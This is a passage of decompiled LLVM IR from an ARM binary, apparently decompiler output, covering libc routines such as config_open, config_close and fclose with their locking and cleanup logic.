dec_label_pc_16b7c:                               ; preds = %dec_label_pc_16b70
  %v0_16b7c = load i32, i32* @r8, align 4
  %v1_16b7c = and i32 %v0_16b7c, 1048576
  %v2_16b7c = icmp eq i32 %v1_16b7c, 0
  store i1 %v2_16b7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b7c, label %dec_label_pc_168d4.backedge, label %dec_label_pc_16b84

dec_label_pc_16b84:                               ; preds = %dec_label_pc_16b7c, %dec_label_pc_16a3c, %.thread, %entry
  br label %dec_label_pc_16b88

dec_label_pc_16b88:                               ; preds = %dec_label_pc_16b70, %dec_label_pc_16958, %dec_label_pc_16b84
  %v0_16b88 = phi i32 [ %v0_16968, %dec_label_pc_16958 ], [ 0, %dec_label_pc_16b84 ], [ %v0_16b74, %dec_label_pc_16b70 ]
  store i32 %v0_16b88, i32* %r0.global-to-local, align 4
  store i32 %v3_16870, i32* @r4, align 4
  store i32 %v6_16870, i32* @r5, align 4
  store i32 %v9_16870, i32* @r6, align 4
  store i32 %v12_16870, i32* @r7, align 4
  store i32 %v15_16870, i32* @r8, align 4
  store i32 %v18_16870, i32* @sb, align 4
  store i32 %v21_16870, i32* @sl, align 4
  store i32 %v24_16870, i32* @fp, align 4
  ret i32 %v0_16b88

; uselistorder directives
  uselistorder i32 %v0_16b88, { 1, 0 }
  uselistorder i32 %v0_16b74, { 0, 2, 1 }
  uselistorder i32 %v3_16b68, { 1, 0 }
  uselistorder i32 %v2_16b68, { 1, 0, 2 }
  uselistorder i32 %v2_16aac, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_16b54.pre, { 0, 2, 1 }
  uselistorder i32 %v5_16ae8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16a94, { 1, 0, 2 }
  uselistorder i1 %v9_16a74, { 1, 0 }
  uselistorder i32 %v3_16a4c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_16a3c, { 1, 0 }
  uselistorder i1 %v8_16a34, { 1, 0 }
  uselistorder i32 %v3_16a04, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_169f4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_169dc, { 1, 0, 2 }
  uselistorder i32 %v1_169cc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_169b8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_169b0, { 1, 0 }
  uselistorder i32 %v1_1699c, { 1, 0 }
  uselistorder i32 %v1_16998, { 1, 0 }
  uselistorder i32 %v2_16974, { 1, 0 }
  uselistorder i32 %v1_16958, { 2, 0, 1 }
  uselistorder i32 %v0_16940, { 1, 0 }
  uselistorder i32 %v1_16930, { 0, 2, 1 }
  uselistorder i32* %v1_16aa0, { 1, 0 }
  uselistorder i1 %v2_16a48, { 1, 0, 2, 3 }
  uselistorder i32 %v1_168bc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_168b0, { 2, 1, 0 }
  uselistorder i32 %v3_16898, { 1, 2, 0 }
  uselistorder i32 %v3_16894, { 2, 1, 0 }
  uselistorder i32 %v1_1688c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 81, { 0, 3, 1, 2 }
  uselistorder i32 %arg3, { 2, 3, 1, 5, 0, 4, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16b88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16b70, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16b60, { 1, 0 }
  uselistorder label %dec_label_pc_16b50, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b04, { 1, 0 }
  uselistorder label %dec_label_pc_168d4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a64, { 1, 0 }
  uselistorder label %dec_label_pc_16a3c, { 1, 0 }
  uselistorder label %dec_label_pc_16a30, { 0, 2, 1 }
  uselistorder label %dec_label_pc_169f4, { 1, 0 }
  uselistorder label %dec_label_pc_16928, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_16b9c = icmp eq i32* %arg1, null
  br i1 %v2_16b9c, label %dec_label_pc_16bc4, label %dec_label_pc_16ba4

dec_label_pc_16ba4:                               ; preds = %entry
  %v2_16ba4 = load i32, i32* %arg1, align 4
  %v1_16ba8 = inttoptr i32 %v2_16ba4 to i16*
  %v2_16ba8 = call i32 @__GI_fclose(i16* %v1_16ba8)
  %v0_16bac = load i32, i32* @r4, align 4
  %v1_16bac = add i32 %v0_16bac, 20
  %v2_16bac = inttoptr i32 %v1_16bac to i32*
  %v3_16bac = load i32, i32* %v2_16bac, align 4
  %v2_16bb0 = icmp eq i32 %v3_16bac, 0
  br i1 %v2_16bb0, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_16ba4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_16ba4, %bb
  store i32 93116, i32* @lr, align 4
  %v1_16bb8 = xor i1 %v2_16bb0, true
  call void @__pseudo_cond_branch(i1 %v1_16bb8, i32 ptrtoint (i32* @global_var_14284.33 to i32))
  %v0_16bbc = load i32, i32* @r4, align 4
  store i32 %v0_16bbc, i32* @r0, align 4
  %v0_16bc0 = call i32 @free()
  br label %dec_label_pc_16bc4

dec_label_pc_16bc4:                               ; preds = %entry, %bb6
  %v1_16bc8 = phi i32 [ 0, %entry ], [ %v0_16bc0, %bb6 ]
  ret i32 %v1_16bc8

; uselistorder directives
  uselistorder label %dec_label_pc_16bc4, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16bd8 = load i32, i32* @r4, align 4
  store i32 %v3_16bd8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 -34252), i32* @r1, align 4
  %v0_16be0 = call i32 @__GI_fopen()
  store i32 %v0_16be0, i32* %r0.global-to-local, align 4
  store i32 %v0_16be0, i32* @r4, align 4
  %v2_16be4 = icmp eq i32 %v0_16be0, 0
  br i1 %v2_16be4, label %bb, label %dec_label_pc_16bf0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_16bf0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_16bf8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_16bf8, i32* %r0.global-to-local, align 4
  %v2_16bfc = icmp eq i32 %v2_16bf8, 0
  br i1 %v2_16bfc, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_16bf0
  %v1_16c00 = load i32, i32* @r4, align 4
  %v3_16c00 = inttoptr i32 %v2_16bf8 to i32*
  store i32 %v1_16c00, i32* %v3_16c00, align 4
  %v1_16c08.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_16bf0, %bb4
  %v1_16c08 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_16bf0 ], [ %v1_16c08.pre, %bb4 ]
  %v2_16c04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16c04, i32* @r4, align 4
  ret i32 %v1_16c08

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 40, 38, 39, 37, 36, 35, 34, 33, 32, 31, 30, 0, 29, 28, 27, 26, 25, 1, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16c14 = load i32, i32* @r4, align 4
  store i32 %v3_16c14, i32* %stack_var_-36, align 4
  %v6_16c14 = load i32, i32* @r5, align 4
  %v9_16c14 = load i32, i32* @r6, align 4
  %v12_16c14 = load i32, i32* @r7, align 4
  %v2_16c18 = add i32 %tmp, 52
  %v3_16c18 = inttoptr i32 %v2_16c18 to i32*
  %v4_16c18 = load i32, i32* %v3_16c18, align 4
  store i32 %v4_16c18, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c20 = icmp eq i32 %v4_16c18, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r8, align 4
  br i1 %v2_16c20, label %dec_label_pc_16c34, label %dec_label_pc_16c98

dec_label_pc_16c34:                               ; preds = %entry
  %v0_16c34 = call i32 @__aeabi_read_tp()
  store i32 %v0_16c34, i32* %r0.global-to-local, align 4
  %v0_16c38 = load i32, i32* @r5, align 4
  %v1_16c38 = add i32 %v0_16c38, 64
  %v2_16c38 = inttoptr i32 %v1_16c38 to i32*
  %v3_16c38 = load i32, i32* %v2_16c38, align 4
  store i32 %v3_16c38, i32* %r3.global-to-local, align 4
  %v1_16c3c = add i32 %v0_16c34, -1168
  store i32 %v1_16c3c, i32* @r6, align 4
  %v3_16c40 = icmp uge i32 %v3_16c38, %v1_16c3c
  store i1 %v3_16c40, i1* %cpsr_c.global-to-local, align 1
  %v9_16c40 = icmp eq i32 %v3_16c38, %v1_16c3c
  br i1 %v9_16c40, label %dec_label_pc_16c8c, label %dec_label_pc_16c48

dec_label_pc_16c48:                               ; preds = %dec_label_pc_16c34
  %v1_16c48 = add i32 %v0_16c38, 56
  store i32 %v1_16c48, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_16c48, i32* %r2.global-to-local, align 4
  %v0_16c54 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16c54, i32* @r4, align 4
  %v1_16c58115 = inttoptr i32 %v1_16c48 to i32*
  %v2_16c58116 = load i32, i32* %v1_16c58115, align 4
  store i32 %v2_16c58116, i32* %r3.global-to-local, align 4
  %v3_16c5c118 = icmp uge i32 %v2_16c58116, %v0_16c54
  store i1 %v3_16c5c118, i1* %cpsr_c.global-to-local, align 1
  %v9_16c5c124 = icmp eq i32 %v2_16c58116, %v0_16c54
  br i1 %v9_16c5c124, label %dec_label_pc_16c64, label %dec_label_pc_16c7c

dec_label_pc_16c64:                               ; preds = %dec_label_pc_16c48, %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge
  %v0_16c64125 = phi i32 [ %v1_16c5c.pre, %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge ], [ %v0_16c54, %dec_label_pc_16c48 ]
  store i32 %v0_16c64125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16c74 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16c74, label %dec_label_pc_16c78, label %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge

dec_label_pc_16c64.dec_label_pc_16c58_crit_edge:  ; preds = %dec_label_pc_16c64
  %v0_16c58.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16c5c.pre = load i32, i32* @r4, align 4
  %v1_16c58 = inttoptr i32 %v0_16c58.pre to i32*
  %v2_16c58 = load i32, i32* %v1_16c58, align 4
  store i32 %v2_16c58, i32* %r3.global-to-local, align 4
  %v3_16c5c = icmp uge i32 %v2_16c58, %v1_16c5c.pre
  store i1 %v3_16c5c, i1* %cpsr_c.global-to-local, align 1
  %v9_16c5c = icmp eq i32 %v2_16c58, %v1_16c5c.pre
  br i1 %v9_16c5c, label %dec_label_pc_16c64, label %dec_label_pc_16c7c

dec_label_pc_16c78:                               ; preds = %dec_label_pc_16c64
  %v0_16c78 = load i32, i32* @r4, align 4
  store i32 %v0_16c78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c7c

dec_label_pc_16c7c:                               ; preds = %dec_label_pc_16c48, %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge, %dec_label_pc_16c78
  %v0_16c7c = phi i32 [ %v0_16c78, %dec_label_pc_16c78 ], [ %v2_16c58116, %dec_label_pc_16c48 ], [ %v2_16c58, %dec_label_pc_16c64.dec_label_pc_16c58_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c7c = icmp eq i32 %v0_16c7c, 0
  br i1 %v2_16c7c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_16c7c
  %v1_16c80 = load i32, i32* @r7, align 4
  store i32 %v1_16c80, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_16c7c, %bb
  %v1_16c84 = xor i1 %v2_16c7c, true
  call void @__pseudo_cond_branch(i1 %v1_16c84, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_16c88 = load i32, i32* @r6, align 4
  %v1_16c88 = load i32, i32* @r5, align 4
  %v2_16c88 = add i32 %v1_16c88, 64
  %v3_16c88 = inttoptr i32 %v2_16c88 to i32*
  store i32 %v0_16c88, i32* %v3_16c88, align 4
  %v0_16c8c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16c8c

dec_label_pc_16c8c:                               ; preds = %dec_label_pc_16c34, %bb41
  %v0_16c8c = phi i32 [ %v0_16c38, %dec_label_pc_16c34 ], [ %v0_16c8c.pre, %bb41 ]
  %v1_16c8c = add i32 %v0_16c8c, 60
  %v2_16c8c = inttoptr i32 %v1_16c8c to i32*
  %v3_16c8c = load i32, i32* %v2_16c8c, align 4
  %v1_16c90 = add i32 %v3_16c8c, 1
  store i32 %v1_16c90, i32* %r3.global-to-local, align 4
  store i32 %v1_16c90, i32* %v2_16c8c, align 4
  %v0_16c98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16c98

dec_label_pc_16c98:                               ; preds = %entry, %dec_label_pc_16c8c
  %v1_16ca0 = phi i32 [ %tmp, %entry ], [ %v0_16c98.pre, %dec_label_pc_16c8c ]
  %v1_16c98 = inttoptr i32 %v1_16ca0 to i16*
  %v2_16c98 = load i16, i16* %v1_16c98, align 2
  %v3_16c98 = zext i16 %v2_16c98 to i32
  store i32 %v3_16c98, i32* %r3.global-to-local, align 4
  %v1_16c9c = and i32 %v3_16c98, 64
  %v2_16c9c = icmp eq i32 %v1_16c9c, 0
  br i1 %v2_16c9c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_16c98
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_16c98, %bb42
  %storemerge = phi i32 [ %v1_16ca0, %bb42 ], [ %v1_16c9c, %dec_label_pc_16c98 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 93352, i32* @lr, align 4
  %v1_16ca4 = xor i1 %v2_16c9c, true
  call void @__pseudo_cond_branch(i1 %v1_16ca4, i32 ptrtoint (i32* @global_var_17ae8.619 to i32))
  %v0_16ca8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16ca8, i32* %fp.global-to-local, align 4
  %v0_16cac = load i32, i32* @r5, align 4
  %v1_16cac = add i32 %v0_16cac, 4
  %v2_16cac = inttoptr i32 %v1_16cac to i32*
  %v3_16cac = load i32, i32* %v2_16cac, align 4
  store i32 %v3_16cac, i32* %r0.global-to-local, align 4
  %v1_16cb0 = call i32 @__GI___libc_close(i32 %v3_16cac)
  store i32 %v1_16cb0, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16cb8 = load i32, i32* @r8, align 4
  %v2_16cb8 = add i32 %v0_16cb8, 160
  %v3_16cb8 = inttoptr i32 %v2_16cb8 to i32*
  %v4_16cb8 = load i32, i32* %v3_16cb8, align 4
  store i32 %v4_16cb8, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16cbc = icmp slt i32 %v1_16cb0, 0
  br i1 %v1_16cbc, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_16cc4 = add i32 %v4_16cb8, 8
  %v2_16cc4 = inttoptr i32 %v1_16cc4 to i32*
  %v3_16cc4 = load i32, i32* %v2_16cc4, align 4
  store i32 %v3_16cc4, i32* %r3.global-to-local, align 4
  %v0_16cc8 = call i32 @__aeabi_read_tp()
  store i32 %v0_16cc8, i32* %r0.global-to-local, align 4
  %v1_16ccc = add i32 %v0_16cc8, -1168
  store i32 %v1_16ccc, i32* %sl.global-to-local, align 4
  %v0_16cd0 = load i32, i32* %r3.global-to-local, align 4
  %v3_16cd0 = icmp uge i32 %v0_16cd0, %v1_16ccc
  store i1 %v3_16cd0, i1* %cpsr_c.global-to-local, align 1
  %v9_16cd0 = icmp eq i32 %v0_16cd0, %v1_16ccc
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_16cd8 = load i32, i32* @r5, align 4
  %v2_16cd8 = add i32 %v1_16cd8, 4
  %v3_16cd8 = inttoptr i32 %v2_16cd8 to i32*
  store i32 -1, i32* %v3_16cd8, align 4
  br i1 %v9_16cd0, label %dec_label_pc_16d20, label %dec_label_pc_16ce0

dec_label_pc_16ce0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_16ce4 = load i32, i32* @r7, align 4
  store i32 %v0_16ce4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16cec108 = inttoptr i32 %v0_16ce4 to i32*
  %v2_16cec109 = load i32, i32* %v1_16cec108, align 4
  store i32 %v2_16cec109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16cf0111 = icmp eq i32 %v2_16cec109, 0
  br i1 %v9_16cf0111, label %dec_label_pc_16cf8, label %dec_label_pc_16d10

dec_label_pc_16cf8:                               ; preds = %dec_label_pc_16ce0, %dec_label_pc_16cf8.dec_label_pc_16cec_crit_edge
  %v0_16cf8112 = phi i32 [ %v1_16cf0.pre, %dec_label_pc_16cf8.dec_label_pc_16cec_crit_edge ], [ 0, %dec_label_pc_16ce0 ]
  store i32 %v0_16cf8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d08 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d08, label %dec_label_pc_16d0c, label %dec_label_pc_16cf8.dec_label_pc_16cec_crit_edge

dec_label_pc_16cf8.dec_label_pc_16cec_crit_edge:  ; preds = %dec_label_pc_16cf8
  %v0_16cec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16cf0.pre = load i32, i32* @r4, align 4
  %v1_16cec = inttoptr i32 %v0_16cec.pre to i32*
  %v2_16cec = load i32, i32* %v1_16cec, align 4
  store i32 %v2_16cec, i32* %r3.global-to-local, align 4
  %v3_16cf0 = icmp uge i32 %v2_16cec, %v1_16cf0.pre
  store i1 %v3_16cf0, i1* %cpsr_c.global-to-local, align 1
  %v9_16cf0 = icmp eq i32 %v2_16cec, %v1_16cf0.pre
  br i1 %v9_16cf0, label %dec_label_pc_16cf8, label %dec_label_pc_16d10

dec_label_pc_16d0c:                               ; preds = %dec_label_pc_16cf8
  %v0_16d0c = load i32, i32* @r4, align 4
  store i32 %v0_16d0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d10

dec_label_pc_16d10:                               ; preds = %dec_label_pc_16ce0, %dec_label_pc_16cf8.dec_label_pc_16cec_crit_edge, %dec_label_pc_16d0c
  %v0_16d10 = phi i32 [ %v0_16d0c, %dec_label_pc_16d0c ], [ %v2_16cec109, %dec_label_pc_16ce0 ], [ %v2_16cec, %dec_label_pc_16cf8.dec_label_pc_16cec_crit_edge ]
  %v1_16d10 = phi i32 [ %v0_16d0c, %dec_label_pc_16d0c ], [ 0, %dec_label_pc_16ce0 ], [ %v1_16cf0.pre, %dec_label_pc_16cf8.dec_label_pc_16cec_crit_edge ]
  %v3_16d10 = icmp uge i32 %v0_16d10, %v1_16d10
  store i1 %v3_16d10, i1* %cpsr_c.global-to-local, align 1
  %v9_16d10 = icmp eq i32 %v0_16d10, %v1_16d10
  br i1 %v9_16d10, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_16d10
  %v1_16d14 = load i32, i32* @r7, align 4
  store i32 %v1_16d14, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16d10, %bb46
  %v1_16d18 = xor i1 %v9_16d10, true
  call void @__pseudo_cond_branch(i1 %v1_16d18, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_16d1c = load i32, i32* %sl.global-to-local, align 4
  %v1_16d1c = load i32, i32* @r7, align 4
  %v2_16d1c = add i32 %v1_16d1c, 8
  %v3_16d1c = inttoptr i32 %v2_16d1c to i32*
  store i32 %v0_16d1c, i32* %v3_16d1c, align 4
  br label %dec_label_pc_16d20

dec_label_pc_16d20:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16d24 = load i32, i32* @r8, align 4
  %v2_16d24 = add i32 %v0_16d24, 160
  %v3_16d24 = inttoptr i32 %v2_16d24 to i32*
  %v4_16d24 = load i32, i32* %v3_16d24, align 4
  store i32 %v4_16d24, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16d2c = add i32 %v0_16d24, 12
  %v3_16d2c = inttoptr i32 %v2_16d2c to i32*
  %v4_16d2c = load i32, i32* %v3_16d2c, align 4
  store i32 %v4_16d2c, i32* %r2.global-to-local, align 4
  %v1_16d30 = add i32 %v4_16d24, 4
  %v2_16d30 = inttoptr i32 %v1_16d30 to i32*
  %v3_16d30 = load i32, i32* %v2_16d30, align 4
  store i32 %v3_16d30, i32* %r1.global-to-local, align 4
  %v1_16d34 = inttoptr i32 %v4_16d2c to i32*
  %v2_16d34 = load i32, i32* %v1_16d34, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d38 = icmp eq i32 %v3_16d30, 0
  %v1_16d3c = add i32 %v2_16d34, 1
  store i32 %v1_16d3c, i32* %r3.global-to-local, align 4
  store i32 %v1_16d3c, i32* %v1_16d34, align 4
  br i1 %v2_16d38, label %dec_label_pc_16d48, label %dec_label_pc_16da8

dec_label_pc_16d48:                               ; preds = %dec_label_pc_16d20
  %v0_16d48 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d48 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d48 = add i32 %v1_16d48, 8
  %v3_16d48 = inttoptr i32 %v2_16d48 to i32*
  store i32 %v0_16d48, i32* %v3_16d48, align 4
  %v0_16d4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16d4c, i32* @r7, align 4
  br label %dec_label_pc_16d50

dec_label_pc_16d50:                               ; preds = %dec_label_pc_16d80.dec_label_pc_16d50_crit_edge, %dec_label_pc_16d48
  %v0_16d50 = phi i32 [ %v0_16d50.pre, %dec_label_pc_16d80.dec_label_pc_16d50_crit_edge ], [ %v0_16d4c, %dec_label_pc_16d48 ]
  %v1_16d50 = inttoptr i32 %v0_16d50 to i32*
  %v2_16d50 = load i32, i32* %v1_16d50, align 4
  store i32 %v2_16d50, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16d50, i32* %r2.global-to-local, align 4
  %v2_16d5c96 = load i32, i32* %v1_16d50, align 4
  store i32 %v2_16d5c96, i32* %r3.global-to-local, align 4
  %v3_16d6098 = icmp uge i32 %v2_16d5c96, %v2_16d50
  store i1 %v3_16d6098, i1* %cpsr_c.global-to-local, align 1
  %v9_16d60104 = icmp eq i32 %v2_16d5c96, %v2_16d50
  br i1 %v9_16d60104, label %dec_label_pc_16d68, label %dec_label_pc_16d80

dec_label_pc_16d68:                               ; preds = %dec_label_pc_16d50, %dec_label_pc_16d68.dec_label_pc_16d5c_crit_edge
  %v0_16d68105 = phi i32 [ %v1_16d60.pre, %dec_label_pc_16d68.dec_label_pc_16d5c_crit_edge ], [ %v2_16d50, %dec_label_pc_16d50 ]
  store i32 %v0_16d68105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d78 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d78, label %dec_label_pc_16d7c, label %dec_label_pc_16d68.dec_label_pc_16d5c_crit_edge

dec_label_pc_16d68.dec_label_pc_16d5c_crit_edge:  ; preds = %dec_label_pc_16d68
  %v0_16d5c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16d60.pre = load i32, i32* @r4, align 4
  %v1_16d5c = inttoptr i32 %v0_16d5c.pre to i32*
  %v2_16d5c = load i32, i32* %v1_16d5c, align 4
  store i32 %v2_16d5c, i32* %r3.global-to-local, align 4
  %v3_16d60 = icmp uge i32 %v2_16d5c, %v1_16d60.pre
  store i1 %v3_16d60, i1* %cpsr_c.global-to-local, align 1
  %v9_16d60 = icmp eq i32 %v2_16d5c, %v1_16d60.pre
  br i1 %v9_16d60, label %dec_label_pc_16d68, label %dec_label_pc_16d80

dec_label_pc_16d7c:                               ; preds = %dec_label_pc_16d68
  %v0_16d7c = load i32, i32* @r4, align 4
  store i32 %v0_16d7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d80

dec_label_pc_16d80:                               ; preds = %dec_label_pc_16d50, %dec_label_pc_16d68.dec_label_pc_16d5c_crit_edge, %dec_label_pc_16d7c
  %v0_16d88 = phi i32 [ %v0_16d7c, %dec_label_pc_16d7c ], [ %v2_16d5c96, %dec_label_pc_16d50 ], [ %v2_16d5c, %dec_label_pc_16d68.dec_label_pc_16d5c_crit_edge ]
  %v1_16d80 = phi i32 [ %v0_16d7c, %dec_label_pc_16d7c ], [ %v2_16d50, %dec_label_pc_16d50 ], [ %v1_16d60.pre, %dec_label_pc_16d68.dec_label_pc_16d5c_crit_edge ]
  %v3_16d80 = icmp uge i32 %v0_16d88, %v1_16d80
  store i1 %v3_16d80, i1* %cpsr_c.global-to-local, align 1
  %v9_16d80 = icmp eq i32 %v0_16d88, %v1_16d80
  br i1 %v9_16d80, label %dec_label_pc_16d88, label %dec_label_pc_16d80.dec_label_pc_16d50_crit_edge

dec_label_pc_16d80.dec_label_pc_16d50_crit_edge:  ; preds = %dec_label_pc_16d80
  %v0_16d50.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16d50

dec_label_pc_16d88:                               ; preds = %dec_label_pc_16d80
  %v2_16d88 = icmp ne i32 %v1_16d80, 0
  store i1 %v2_16d88, i1* %cpsr_c.global-to-local, align 1
  %v7_16d8c = icmp slt i32 %v1_16d80, 2
  br i1 %v7_16d8c, label %dec_label_pc_16da8, label %dec_label_pc_16d90

dec_label_pc_16d90:                               ; preds = %dec_label_pc_16d88
  %v0_16d90 = load i32, i32* @r7, align 4
  store i32 %v0_16d90, i32* %r0.global-to-local, align 4
  %v0_16d94 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d94 = add i32 %v0_16d94, 129
  store i32 %v1_16d94, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16da8

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16d20, %dec_label_pc_16d90, %dec_label_pc_16d88
  %v0_16da8 = load i32, i32* @r5, align 4
  %v1_16da8 = inttoptr i32 %v0_16da8 to i16*
  %v2_16da8 = load i16, i16* %v1_16da8, align 2
  %v3_16da8 = zext i16 %v2_16da8 to i32
  %v1_16dac = and i32 %v3_16da8, 24576
  %v1_16db0 = or i32 %v1_16dac, 48
  store i32 %v1_16db0, i32* %r3.global-to-local, align 4
  %v0_16db4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16db4 = icmp eq i32 %v0_16db4, 0
  %v1_16db8 = trunc i32 %v1_16db0 to i16
  store i16 %v1_16db8, i16* %v1_16da8, align 2
  br i1 %v2_16db4, label %dec_label_pc_16dc0, label %dec_label_pc_16e34

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16da8
  %v0_16dc0 = load i32, i32* @r5, align 4
